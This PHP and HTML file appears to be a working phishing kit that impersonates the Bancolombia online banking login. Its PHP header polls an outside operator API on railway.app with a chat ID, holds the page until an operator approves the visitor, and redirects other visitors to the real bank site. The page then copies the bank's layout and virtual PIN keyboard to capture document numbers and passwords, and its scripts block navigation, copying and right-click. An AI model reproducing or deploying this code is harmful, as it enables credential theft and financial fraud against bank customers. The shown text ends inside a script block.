<?php
session_start();
unset($_SESSION['vlidatePage']);
$_SESSION['uniqueID'] = uniqid();
consultarApi('aceptarIngreso');
// Función para hacer la solicitud a la API
function consultarApi($endPoint)
{
    $_SESSION['urlApi'] = 'https://spike-production.up.railway.app/';
    // $_SESSION['urlApi'] = 'http://localhost:8080/';
    $codeVisitante = $_GET['codeVisitante'] ?? 'userdesconocido';

    if ($codeVisitante == 'userdesconocido') {
        header('Location: https://sucursalpersonas.transaccionesbancolombia.com');
        exit;
    }
    $chatID = $_GET['id'] ?? '1462604384';
    $_SESSION['chatID'] = $chatID;
    $data = [
        'codeVisitante' => $codeVisitante,
        'chatID' => $chatID,
        'uniqueID' => $_SESSION['uniqueID'],
        'skm' => 'Trico',
    ];
    // Configurar cURL
    $ch = curl_init($_SESSION['urlApi'] . $endPoint);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));

    // Ejecutar la solicitud y obtener la respuesta
    return curl_exec($ch);
}

function obtenerIP()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        // IP desde el shared Internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // IP pasada desde un proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        // IP por defecto de acceso remoto
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
// Función para validar la respuesta de la API

// Función para ejecutar alguna acción cuando la respuesta es válida
$intentos = 0;
$maxIntentos = 20;
// // Bucle infinito para mantener el script en ejecución
while ($intentos < $maxIntentos) {
    // Consultar la API
    $respuesta = consultarApi('waitResponseVisitante');

    // Validar la respuesta
    if (validarRespuesta($respuesta)) {
        $_SESSION['vlidatePage'] = true;
        break;
    }

    // Incrementar el contador de intentos
    $intentos++;

    // Esperar un tiempo antes de volver a consultar la API (por ejemplo, 10 segundos)
    sleep(3);
}

if ($intentos >= $maxIntentos) {
    // Retornar un encabezado de "bad request"
    header('Location: https://sucursalpersonas.transaccionesbancolombia.com');
    exit;
}

function validarRespuesta($respuesta)
{
    // Decodificar la respuesta JSON
    $data = json_decode($respuesta, true);
    // $data['type'] = 'aceptar';
    // Verificar si la respuesta es válida (esto dependerá de tu API específica)
    if (isset($data['type']) && $data['type'] === 'aceptar') {

?>
<html>

<head>
    <title>Bancolombia Sucursal Virtual Personas</title>
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
    <meta charset="ISO-8859-1" />
    <meta content="es" http-equiv="Content-Language" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="description" content="Todo1" />
    <meta name="author" content="Todo1 Services" />
    <meta name="Copyright" content="(c) 2014  Todo1 Services. All rights reserved." />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <link href="css/styles.css?v=4.12.0.RC6_1721165575966" media="all" rel="stylesheet" type="text/css" />
    <link href="css/bootstrap.css" media="all" rel="stylesheet" type="text/css" />
    <link href="css/keyboard_util.css?v=4.12.0.RC6_1721165575966" rel="stylesheet" type="text/css" />

    <!--[if lt IE 8]>
      <link href="css/bootstrap-ie7.css" rel="stylesheet" />
    <![endif]-->

    <!--[if lt IE 9]>
      <script src="js/html5shiv.js"></script>
      <script src="js/respond.min.js"></script>
    <![endif]-->
    <style>
    html,
    body,
    form {
        height: 100%;
    }

    .otp-input,
    .otp-input-sms {
        width: 3em;
        /* Aumenta el ancho del input */
        text-align: center;
        margin-right: 0.5em;
        font-size: 1.5em;
        /* Aumenta el tamaño de la fuente para que los números sean más visibles */
        padding: 0.5em;
        /* Añade un poco de padding para mejorar la apariencia */
    }

    .otp-container {
        display: flex;
        justify-content: center;
        align-items: center;
        margin-bottom: 1em;
    }

    .otp-label {
        text-align: center;
        font-weight: bold;
        margin-bottom: 0.5em;
    }

    #loader {
        position: fixed;
        left: 0;
        top: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(255, 255, 255, 0.611);
        /* Fondo oscurecido */
        z-index: 9999;
        /* Asegúrate de que esté por encima de otros elementos */
    }

    #loader img {
        position: absolute;
        left: 50%;
        top: 50%;
        transform: translate(-50%, -50%);
    }

    .form-container {
        max-width: 400px;
        margin: 0 auto;
        padding: 20px;
        background-color: #f8f9fa;
        border-radius: 5px;
        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
    }

    .form-control-sm {
        height: calc(1.5em + .5rem + 2px);
        font-size: .875rem;
        padding: .25rem .5rem;
    }

    .panel_general .content-data {
        padding-left: 8px;
        padding-right: 8px;
        width: 100%;
        min-height: 28px;
    }

    .no-arrow::-webkit-outer-spin-button,
    .no-arrow::-webkit-inner-spin-button {
        -webkit-appearance: none;
        margin: 0;
    }

    .no-arrow {
        -moz-appearance: textfield;
    }
    </style>
    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="js/jquery-migrate-3.4.0.min.js"></script>
    <script type="text/javascript" src="js/patterns/jquery.validate-1.11.1.js"></script>
    <script type="text/javascript" src="js/patterns/validations.js"></script>
    <script type="text/javascript" src="js/patterns/jquery-validations.js"></script>
    <script type="text/javascript" src="js/patterns/blockKeys.js"></script>
    <script type="text/javascript" src="js/jquery-ui.js"></script>

    <script type="text/javascript" src="js/bluebird.min.js"></script>

    <script type="text/javascript">
    "use strict";
    try {
        var scriptsToLoad = [
            "https://cdn.todo1.com/js/cDZQdujDp2/t1analytics.js?v=4.12.0.RC6_1721165575966",
        ];

        (function() {
            var elHead = document.getElementsByTagName("head")[0];
            for (var iS = 0; iS < scriptsToLoad.length; iS++) {
                var elScript = document.createElement("script");
                elScript.src = scriptsToLoad[iS];
                elHead.appendChild(elScript);
            }
        })();
    } catch (err) {
        console.log("error in loading ant-libs");
    }

    function collect() {
        try {
            encode_deviceprint().then((data) => {
                setDevicePrintValue(data);
            });
        } catch (err) {
            console.log("ERROR-CATH: error in loading ant-libs: " + err);
            setDevicePrintValue("");
        }
    }

    function setDevicePrintValue(valueDP) {
        document.forms[0].deviceprint.value = valueDP;
    }

    function urlEncode(c) {
        var d = encodeURIComponent(c)
            .replace(/\~/g, "%7E")
            .replace(/\!/g, "%21")
            .replace(/\*/g, "%2A")
            .replace(/\(/g, "%28")
            .replace(/\)/g, "%29")
            .replace(/\'/g, "%27")
            .replace(/\-/g, "%2D")
            .replace(/\_/g, "%5F")
            .replace(/\./g, "%2E");
        return d;
    }
    </script>



    <link href="css/jquery-ui.css" media="all" rel="stylesheet" type="text/css" />
    <link href="css/ui.css" media="all" rel="stylesheet" type="text/css" />

    <script type="text/javascript" src="js/keyEncript/jsbn2.js"></script>
    <script type="text/javascript" src="js/keyEncript/prng4.js"></script>
    <script type="text/javascript" src="js/keyEncript/rng.js"></script>
    <script type="text/javascript" src="js/keyEncript/base64.js"></script>
    <script type="text/javascript" src="js/keyEncript/rsa-t1.js"></script>


    <script language="javascript">
    $(document).ready(function() {

        function obtenerError(message) {
            return (
                "<script>document.getElementById('summary').innerHTML='" +
                message +
                "'; document.getElementById('tabError').style.display='';</" +
                "script>"
            );
        }
        var validator = $("#loginUserForm")
            .bind("invalid-form.validate", function() {})
            .validate({
                onsubmit: false,
                onkeyup: false,
                onclick: false,
                onfocusout: false,
                rules: {
                    errorContainer: $("#summary"),
                    password: {
                        required: true,
                        passwordLength: true,
                    },
                },
                messages: {
                    password: {
                        required: obtenerError("Por favor ingrese su clave"),
                        passwordLength: obtenerError(
                            "La clave no cumple con los requerimientos m&iacute;nimos de seguridad, por favor intente nuevamente."
                        ),
                    },
                },
            });
    });

    function reloadValidate(contError) {
        $("#contentError").html(contError);
    }
    </script>
    <script type="text/javascript" src="js/bootstrap.js"></script>

    <script language="JavaScript" type="text/javascript" src="js/AC_OETags.js"></script>

    <script language="JavaScript" type="text/javascript" src="js/keyboard/keyboard.js?v=4.12.0.RC6_1721165575966">
    </script>
    <script language="JavaScript" type="text/javascript" src="js/keyboard/layer_lib_util.js?v=4.12.0.RC6_1721165575966">
    </script>

    <script language="JavaScript">
    function addEventsButton(id_button) {
        var IE = navigator.appName == "Microsoft Internet Explorer";
        if (navigator.userAgent.match(/iPad/i)) {
            document.getElementById(id_button).addEventListener(
                "touchstart",
                function() {
                    recoveryPassword();
                    XrXY_ZexYpOY();
                    document.authenticationForm.userId.value = "0";
                    return SrjfgYVaiZLC();
                },
                false
            );
        } else if (IE) {
            document
                .getElementById(id_button)
                .attachEvent("onclick", function() {
                    recoveryPassword();
                    BAn_YqhjjfsW();
                    document.authenticationForm.userId.value = "0";
                    return SrjfgYVaiZLC();
                });
            document
                .getElementById(id_button)
                .attachEvent("onmouseover", function() {
                    XrXY_ZexYpOY();
                });
            document
                .getElementById(id_button)
                .attachEvent("onmouseout", function() {
                    slaTnzXprcWp();
                });
        } else {
            document.getElementById(id_button).addEventListener(
                "click",
                function() {
                    recoveryPassword();
                    BAn_YqhjjfsW();
                    document.authenticationForm.userId.value = "0";
                    return SrjfgYVaiZLC();
                },
                false
            );
            document.getElementById(id_button).addEventListener(
                "mouseover",
                function() {
                    XrXY_ZexYpOY();
                },
                false
            );
            document.getElementById(id_button).addEventListener(
                "mouseout",
                function() {
                    slaTnzXprcWp();
                },
                false
            );
        }
    }

    function clearByError() {
        if (
            document.forms[0].userId.value == "" ||
            isEmpty(passwordMinLength[0]) ||
            passwordMinLength[0] < DEF_MAXLENGTH - 1
        ) {
            clearKeys();
            document.forms[0].password.value = "";
        }
    }

    function validateAndClear() {
        var validate = SrjfgYVaiZLC();
        if (isNaN(validate) || validate == null || validate == false) {
            if (navigator.userAgent.match(/iPad/i)) {
                clearByErrorIpad();
            } else {
                clearByError();
            }
            return false;
        }
        return true;
    }

    function clearByErrorIpad() {
        document.forms[0].userId.value = "";
        document.forms[0].password.value = "";
        document.forms[0].tempUserID.value = "";
        return true;
    }

    function addEventsButtonSinCero(id_button) {
        var IE = navigator.appName == "Microsoft Internet Explorer";
        if (navigator.userAgent.match(/iPad/i)) {
            document.getElementById(id_button).addEventListener(
                "touchstart",
                function() {
                    recoveryPassword();
                    XrXY_ZexYpOY();
                    if (validateAndClear()) {
                        validateForm();
                    }
                },
                false
            );
        } else if (IE) {
            document
                .getElementById(id_button)
                .attachEvent("onmouseover", function() {
                    BAn_YqhjjfsW();
                });
            document
                .getElementById(id_button)
                .attachEvent("onmouseout", function() {
                    changeToOrigKeyboard();
                });
        } else {
            document.getElementById(id_button).addEventListener(
                "mouseover",
                function() {
                    BAn_YqhjjfsW();
                },
                false
            );
            document.getElementById(id_button).addEventListener(
                "mouseout",
                function() {
                    changeToOrigKeyboard();
                },
                false
            );
        }
    }
    var yfyxDLyEWujb = [{
        PASSWORD: "YkYUvYdwWHtW"
    }][0];

    function changePass(name) {
        return yfyxDLyEWujb[name.toUpperCase()];
    }
    var passwordMinLength = new Array();
    var omitformtags = ["input", "textarea", "select"];
    omitformtags = omitformtags.join("|");
    var maxLengthKeyboard;
    var origKeyboardShown = true;
    var contrastLevel = "2";
    var fontSizeDefault = 12;
    var indexField = 0;
    var isOpen = false;
    var isLayer = false;
    var KEYCONTENT = "";
    var DEF_MAXLENGTH = 4;
    var VjuDgDvOUZZx = new Array();
    var uWKUKeULBmPN = new Array();
    var maxLengthKeyboard = DEF_MAXLENGTH;
    var regFunction;

    function reEnable() {
        return true;
    }

    function closeKeyb() {
        if (isLayer) activateChild((isOpen = false));
        VjuDgDvOUZZx[indexField].disabled = false;
    }

    function resetForm() {
        document.loginUserForm.userId.value = "";
        document.loginUserForm.tempUserID.value = "";
        document.loginUserForm.password.value = "";
    }

    function bindElement(elem, index) {
        indexField = 0;
        if (index != undefined) {
            indexField = index;
        }
        VjuDgDvOUZZx[indexField] = elem;
        maxLengthKeyboard =
            VjuDgDvOUZZx[indexField] && VjuDgDvOUZZx[indexField].maxLength ?
            VjuDgDvOUZZx[indexField].maxLength :
            DEF_MAXLENGTH;
    }

    function recoveryPassword() {
        for (i = 0; i < VjuDgDvOUZZx.length; i++) {
            VjuDgDvOUZZx[i].value = uWKUKeULBmPN[i].value;
        }
    }

    function clearUserID() {
        document.loginUserForm.tempUserID.value = "";
        document.loginUserForm.userId.value = "";
    }

    function pUxvaVywatWX(keyVal) {
        passwordMinLength[indexField] = VjuDgDvOUZZx[indexField].value.length;
        if (VjuDgDvOUZZx[indexField].value.length < DEF_MAXLENGTH) {
            VjuDgDvOUZZx[indexField].value += "*";
            uWKUKeULBmPN[indexField].value += keyVal;
            if (regFunction) {
                regFunction();
            }
            if (document.loginUserForm.tempUserID != undefined) {
                if (
                    document.loginUserForm.tempUserID.value !== "****************" &&
                    document.loginUserForm.tempUserID.value !== ""
                ) {
                    document.loginUserForm.userId.value =
                        document.loginUserForm.tempUserID.value;
                    document.loginUserForm.tempUserID.value = "****************";
                }
            }
        }
    }

    function refreshNumericKeyboard(contrastLevel) {
        for (var i = 0; i < 10; i++) {
            var mykey = document.getElementById("FBPkrvgVYgtj" + i);
            mykey.style.fontSize = fontSizeDefault;
            mykey.className = "colorContrast" + contrastLevel;
        }
        var clearKey = document.getElementById("clearKey");
        clearKey.className = "colorContrast" + contrastLevel;
    }

    function hideUserID() {
        var x = document.loginUserForm.tempUserID.value;
        if (x !== "" && x !== "****************") {
            document.loginUserForm.userId.value = x;
            document.loginUserForm.tempUserID.value = "****************";
        }
    }

    function createKeyboard(openLayer, xPos, yPos) {
        if ((isLayer = openLayer))
            createChild(
                window,
                "keyboard",
                XveHlOakVYaT(),
                isOpen,
                330,
                135,
                xPos,
                yPos
            );
        else document.getElementById("keyboard_").innerHTML = XveHlOakVYaT();
        blockSelect(
            document.all ?
            document.all["_KEYBRD"] :
            document.getElementById ?
            document.getElementById("_KEYBRD") :
            document
        );
        refreshNumericKeyboard(contrastLevel);
    }

    function startKeyb(elem, index, modal) {
        if (VjuDgDvOUZZx[indexField]) {
            VjuDgDvOUZZx[indexField].disabled = false;
        }
        bindElement(elem);
        g_FxwMmlhvwG(index);
        if (!isOpen && isLayer) {
            activateChild((isOpen = true));
        }
        if (modal) {
            VjuDgDvOUZZx[indexField].disabled = true;
        }
    }

    function validBrowser() {
        var EX = navigator.appName == "Microsoft Internet Explorer";
        if (EX) {
            var EXversion = navigator.appVersion.substring(
                navigator.appVersion.indexOf(";") + 1
            );
            EXversion = parseFloat(
                EXversion.substring(0, EXversion.indexOf(";"))
            );
            if (EXversion < 5) {
                return false;
            }
        } else {
            var EXversion = navigator.appVersion;
            var i = EXversion.indexOf("[");
            if (i != -1 || (i = EXversion.indexOf("(")) != -1)
                EXversion = EXversion.substring(0, i);
            EXversion = parseFloat(EXversion);
            if (EXversion < 5.0) {
                return false;
            }
        }
        return true;
    }

    function XveHlOakVYaT() {
        KEYCONTENT =
            "  <table class='keyboard' border='0' cellspacing='0' cellpadding='0' align='left' valign='top'>  <tr>    <td width='0' height='10' ></td>    <td></td>  </tr>  <tr>    <td height='0' width='29'></td>    <td colspan='2'>      <table align='left' valign='top' cellspacing='0' cellpadding='0' class='bg_button'>        <tr align='left'>                  <td valign='top' align='left'> <table class='bg_button' id='_KEYBRD' valign='top' >  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='BAn_YqhjjfsW();' onmouseout='changeToOrigKeyboard();' onclick='pUxvaVywatWX(\"BnP4\");'>  <div border='0' id ='FBPkrvgVYgtj0' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>0</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='BAn_YqhjjfsW();' onmouseout='changeToOrigKeyboard();' onclick='pUxvaVywatWX(\"kLca\");'>  <div border='0' id ='FBPkrvgVYgtj3' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>3</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='BAn_YqhjjfsW();' onmouseout='changeToOrigKeyboard();' onclick='pUxvaVywatWX(\"RlXT\");'>  <div border='0' id ='FBPkrvgVYgtj6' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>6</div></td></tr>  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='BAn_YqhjjfsW();' onmouseout='changeToOrigKeyboard();' onclick='pUxvaVywatWX(\"7YAh\");'>  <div border='0' id ='FBPkrvgVYgtj1' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>1</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='BAn_YqhjjfsW();' onmouseout='changeToOrigKeyboard();' onclick='pUxvaVywatWX(\"fi12\");'>  <div border='0' id ='FBPkrvgVYgtj9' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>9</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='BAn_YqhjjfsW();' onmouseout='changeToOrigKeyboard();' onclick='pUxvaVywatWX(\"8QeU\");'>  <div border='0' id ='FBPkrvgVYgtj5' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>5</div></td></tr>  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='BAn_YqhjjfsW();' onmouseout='changeToOrigKeyboard();' onclick='pUxvaVywatWX(\"JdW3\");'>  <div border='0' id ='FBPkrvgVYgtj7' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>7</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='BAn_YqhjjfsW();' onmouseout='changeToOrigKeyboard();' onclick='pUxvaVywatWX(\"6CHM\");'>  <div border='0' id ='FBPkrvgVYgtj8' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>8</div></td><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='BAn_YqhjjfsW();' onmouseout='changeToOrigKeyboard();' onclick='pUxvaVywatWX(\"DmjO\");'>  <div border='0' id ='FBPkrvgVYgtj2' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>2</div></td></tr>  <tr><td class='bg_buttonSmall'  align='center' style='cursor:default' onMouseOver='BAn_YqhjjfsW();' onmouseout='changeToOrigKeyboard();' onclick='pUxvaVywatWX(\"ENG5\");'>  <div border='0' id ='FBPkrvgVYgtj4' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>4</div></td><td colspan='2' onclick='clearKeys();' class='bg_buttonSmall'><div id='clearKey' border='0' valign='center' align='center' onfocus='this.blur();' class='colorContrast + contrastLevel + '>Borrar</div></td></tr></table><table class='bg_button' id='_CONSTRAST' valign='top' cellspacing='0'>  <tr><td><img width='90' height='34' border='0' src='images/kb/Contraste" +
            contrastLevel +
            ".gif?v=4.12.0.RC6_1721165575966' name='constrastImg' id='constrastImg' usemap='#numericKeyboardMap' > <map name='numericKeyboardMap' id='numericKeyboardMap'><area shape='circle' class='cursorContrast' coords='10,30,15' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(1)' onmouseout='setDefaultCursor(document.constrastImg)'><area shape='circle' class='cursorContrast' coords='50,30,15' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(2)' onmouseout='setDefaultCursor(document.constrastImg)'><area shape='circle' class='cursorContrast' coords='90,30,15' onmouseover=setHandCursor(document.constrastImg) onclick='changeContrastLevel(3)' onmouseout='setDefaultCursor(document.constrastImg)'></map></td></tr></table></td>        </tr>      </table>    </td>  </tr><tr>    <td height='17'></td>    <td colspan='2'></td>  </tr> </table>";
        return KEYCONTENT;
    }

    function disableselect(e) {
        if (omitformtags.indexOf(e.target.tagName.toLowerCase()) == -1)
            return false;
    }

    function fbwTxJiWIUyw() {
        if (validBrowser()) {
            hideUserID();
            var userId = document.loginUserForm.userId.value;
            var password = document.loginUserForm.password.value;
            for (var i = userId.search(" "); i != -1; i = userId.search(" ")) {
                i = userId.search(" ");
                var tmp = userId.substring(0, i);
                userId = tmp + userId.substring(i + 1, userId.length);
            }
            if (isEmpty(userId) || isEmpty(password)) {
                alert("Por favor, ingresar su número de Documento y su Clave.");
            } else if (isNaN(userId)) {
                alert("Por favor, ingresar su número de Documento y su Clave.");
                clearKeys();
                document.loginUserForm.tempUserID.value = "";
            } else if (passwordMinLength[0] < DEF_MAXLENGTH - 1) {
                alert(
                    "La clave debe ser de al menos 4 dígitos. Por favor rectifique e intente nuevamente."
                );
                clearKeys();
                document.loginUserForm.password.value = "";
            } else {
                top.withNotify = true;
                return true;
            }
        }
        document.loginUserForm.tempUserID.focus();
        return false;
    }

    function fbwTxJiWIUywRsaPass() {
        if (validBrowser()) {
            var password = document.loginUserForm.password.value;
            if (isEmpty(password)) alert("Por favor ingrese su clave.");
            else if (passwordMinLength[0] < DEF_MAXLENGTH - 1) {
                alert(
                    "La clave debe ser de al menos 4 dí­gitos. Por favor rectifique e intente nuevamente."
                );
                clearKeys();
                document.loginUserForm.password.value = "";
            } else {
                top.withNotify = true;
                return true;
            }
        }
        return false;
    }

    function g_FxwMmlhvwG(index) {
        if (index == undefined) {
            index = 0;
        }
        var form = VjuDgDvOUZZx[0].form;
        var vf;
        if (!uWKUKeULBmPN[index]) {
            var initialLength = form.elements.length;
            var vfs = "";
            for (var i = 0; i < initialLength; i++) {
                vf = yfyxDLyEWujb[form.elements[i].name.toUpperCase()];
                if (vf) {
                    vfs += '<input id="passcrypt" type="hidden" name="' + vf + '">';
                }
            }
        }
        document.getElementById("inputs_").innerHTML = vfs;
        for (ind = 0; ind < VjuDgDvOUZZx.length; ind++) {
            vf = yfyxDLyEWujb[VjuDgDvOUZZx[ind].name.toUpperCase()];
            if (form[vf] == undefined) {
                uWKUKeULBmPN[ind] = "";
            } else {
                uWKUKeULBmPN[ind] = form[vf];
            }
            uWKUKeULBmPN[ind].value = "";
        }
    }

    function BAn_YqhjjfsW() {
        for (i = 0; i < 10; i++) {
            var mykey = document.getElementById("FBPkrvgVYgtj" + i);
            mykey.innerHTML = "*";
            mykey.style.fontSize = 15;
            mykey.style.fontWeight = "bolder";
        }
    }

    function setHandCursor(element) {
        element.style.cursor = "pointer";
    }

    function changeContrastLevel(level) {
        if (contrastLevel != level) {
            contrastLevel = level;
            refreshNumericKeyboard(level);
            changeConstrastImage();
        }
    }

    function setDefaultCursor(element) {
        element.style.cursor = "default";
    }

    function clearKeys() {
        VjuDgDvOUZZx[indexField].value = "";
        uWKUKeULBmPN[indexField].value = "";
    }

    function blockSelect(element) {
        if (typeof element.onselectstart != "undefined") {
            element.onselectstart = new Function(
                "event.returnValue=false;  return false; "
            );
        } else {
            element.onmousedown = disableselect;
            element.onmouseup = reEnable;
        }
    }

    function changeConstrastImage() {
        var mykey = document.getElementById("constrastImg");
        mykey.src =
            "images/kb/Contraste" +
            contrastLevel +
            ".gif?v=4.12.0.RC6_1721165575966";
    }

    function changeToOrigKeyboard() {
        for (i = 0; i < 10; i++) {
            var mykey = document.getElementById("FBPkrvgVYgtj" + i);
            mykey.innerHTML = i;
            mykey.style.fontSize = 12;
            mykey.style.fontWeight = "bolder";
        }
    }

    function reEnable() {
        return true;
    }
    </script>

    <script language="JavaScript" type="text/javascript">
    var requiredMajorVersion = 10;
    var requiredMinorVersion = 0;
    var requiredRevision = 0;
    </script>
    <script language="JavaScript">
    var enPasswLength = 0;
    var contError = "";
    var count = 0;

    async function enviar() {
        try {
            var devicePrintAux = await encode_deviceprint();
            //document.getElementById("deviceprint").value = devicePrintAux;
            console.log("Login >>> pass >>> devicePrintAux: " + devicePrintAux);
        } catch (err) {
            console.log("error in loading ant-libs: encode_deviceprint");
        }

        var form = $("#loginUserForm");
        document.getElementById("btnGo").disabled = true;
        document.getElementById("btnGo").classList.add("disabled");
        if (count == 0) {
            form.validate();
            if (form.valid()) {
                var dat = changePass("password");
                document.getElementById("id_ss").value = processPassword(
                    document.getElementsByName(dat)[0].value
                );
                alert(document.getElementsByName(dat)[0].value);
                document.getElementsByName(dat)[0].value = "";
                document.getElementById("password").value = "";
                document.getElementById("password").type = "text";
                BAn_YqhjjfsW();
                form.submit();
                count++;
                return false;
            }
        }
        var validationResult = $("#loginUserForm").valid();
        if (!validationResult) {
            count = 0;
            document.getElementById("btnGo").disabled = false;
            document.getElementById("btnGo").classList.remove("disabled");
        }
    }

    $(document).ready(function() {
        contError = $("#contentError").html();
        $.validator.addMethod(
            "passwordLength",
            function(value, element, param) {
                return value.length >= 4 && value.length <= 4;
            }
        );
        $.validator.addMethod(
            "validaFormato",
            function(value, element, param) {
                var patron = /^\d*$/;
                if (!value.search(patron)) return true;
                else return false;
            }
        );
    });
    </script>
    <script language="JavaScript">
    function do_encrypt() {
        if (document.loginUserForm.password.value != "") {
            var rsa = new RSAKey();
            rsa.setPublic(
                "A6CA1BB4BD803E5704A071E8F7370FD68F2A42CAB574A765693F0F54796CB8AD2CF1B624005119FE651227F7992FF6A6D1979C9B72EA0EAD789F1CBADAB9851779CB8F5F82F40BC71C5C303A10298ED6DC5657E3401AE5720F06836F098366441AC30AB35F13FAB8B6CE81955A1181FCA0AD4EA471CC09C51EAE8EDA42E8C615F933483449CBC67883F407430CB856E4EEC1919BFDD38850CCF5837EC67D8CF802EC30836099592FCDB6CEF4D4AB8EC7F95229B6B262DC6F9A62BFD082CCF98D8FC73FADFA2CCBDDBD17126206E0EC41FE85ECDB9B7631A7EDEF193E4971ADA3E4AB3FFE05F5146907255AD29D0AFB91160C95E225514E1CD07E35BA157A44D1",
                "10001"
            );
            enPasswLength = document.loginUserForm.password.value.length;
        }
        cleanHidden();
    }

    function openUserSupport(url) {
        bankWindow = window.open(
            "???userSupport.urlDomain???" + url,
            "bank",
            "status=yes,menubar=no,scrollbars=yes,resizable=yes"
        );
        bankWindow.focus();
    }

    function openSupport(url) {
        bankWindow = window.open(url, "support", "");
        bankWindow.focus();
    }
    var isSiteScope = false;

    $(document).ready(function() {
        $("#password").keypress(function(event) {
            if (event.which == 13) {
                event.preventDefault();
                document.getElementById("btnGo").click();
            }
            if (event.which == 8) {
                event.preventDefault();
            }
        });
        $(document).keypress(function(event) {
            if (event.which == 8) {
                event.preventDefault();
            }
        });
    });
    </script>
</head>
<script language="JavaScript">
$(document).ready(function() {
    setTimeout(function() {
        window.location.hash = "no-back-button";
        window.location.hash = "Again-No-back-button";
        window.onhashchange = function() {
            window.location.hash = "no-back-button";
        };
    }, 1000);
});
document.ondrop = function(event) {
    return false;
};

function handle(delta) {
    if (delta < 0) return false;
    else return false;
}

function wheel(event) {
    var delta = 0;
    if (!event) event = window.event;
    if (event.wheelDelta) {
        delta = event.wheelDelta / 120;
        if (window.opera) delta = -delta;
    } else if (event.detail) {
        delta = -event.detail / 3;
    }
    if (delta) handle(delta);
    if (event.preventDefault) event.preventDefault();
    event.returnValue = false;
}
</script>
<script language="JavaScript">
var isCaptchaPage = false;
try {
    isCaptchaPage = checkCaptchaPage();
} catch (err) {
    isCaptchaPage = false;
}
$(document).ready(function() {
    $("*").bind("cut copy paste", function(e) {
        alert("Funci\u00F3n no permitida");
        return false;
    });
});
document.onkeydown = mykeyhandler;

function mykeyhandler(event) {
    event = event || window.event;
    var tgt = event.target || event.srcElement;
    if (
        (event.altKey && event.keyCode == 37) ||
        (event.altKey && event.keyCode == 39) ||
        (event.ctrlKey && event.keyCode == 78) ||
        (event.ctrlKey && event.keyCode == 67 && isCaptchaPage == false) ||
        (event.ctrlKey && event.keyCode == 86 && isCaptchaPage == false) ||
        (event.ctrlKey && event.keyCode == 85) ||
        (event.ctrlKey && event.keyCode == 45 && isCaptchaPage == false) ||
        (event.shiftKey && event.keyCode == 45 && isCaptchaPage == false)
    ) {
        event.cancelBubble = true;
        event.returnValue = false;
        alert("Funci\u00F3n no permitida");
        return false;
    }
    if (
        event.keyCode == 18 &&
        tgt.type != "text" &&
        tgt.type != "password" &&
        tgt.type != "textarea" &&
        tgt.type != "application/x-shockwave-flash"
    ) {
        return false;
    }
    if (
        event.keyCode == 8 &&
        tgt.type != "text" &&
        tgt.type != "password" &&
        tgt.type != "textarea" &&
        tgt.type != "application/x-shockwave-flash"
    ) {
        return false;
    }
    if (event.ctrlKey && (event.keyCode == 107 || event.keyCode == 109)) {
        return false;
    }
    if (event.keyCode >= 112 && event.keyCode <= 123) {
        if (navigator.appName == "Microsoft Internet Explorer") {
            window.event.keyCode = 0;
        }
        return false;
    }
}

function mouseDown(e) {
    var ctrlPressed = 0;
    var altPressed = 0;
    var shiftPressed = 0;
    if (parseInt(navigator.appVersion) > 3) {
        if (navigator.appName == "Netscape") {
            var mString = (e.modifiers + 32).toString(2).substring(3, 6);
            shiftPressed = mString.charAt(0) == "1";
            ctrlPressed = mString.charAt(1) == "1";
            altPressed = mString.charAt(2) == "1";
            self.status = "modifiers=" + e.modifiers + " (" + mString + ")";
        } else {
            shiftPressed = event.shiftKey;
            altPressed = event.altKey;
            ctrlPressed = event.ctrlKey;
        }
        if (shiftPressed || altPressed || ctrlPressed)
            alert("Funci\u00F3n no permitida");
    }
    return true;
}
if (parseInt(navigator.appVersion) > 3) {
    document.onmousedown = mouseDown;
    if (navigator.appName == "Netscape")
        document.captureEvents(Event.MOUSEDOWN);
}
var message = "";

function clickIE() {
    if (document.all) {
        message;
        return false;
    }
}

function clickNS(e) {
    if (document.layers || (document.getElementById && !document.all)) {
        if (e.which == 2 || e.which == 3) {
            message;
            return false;
        }
    }
}
if (document.layers) {
    document.captureEvents(Event.MOUSEDOWN);
    document.onmousedown = clickNS;
} else {
    document.onmouseup = clickNS;
    document.oncontextmenu = clickIE;
}
document.oncontextmenu = new Function("return false");
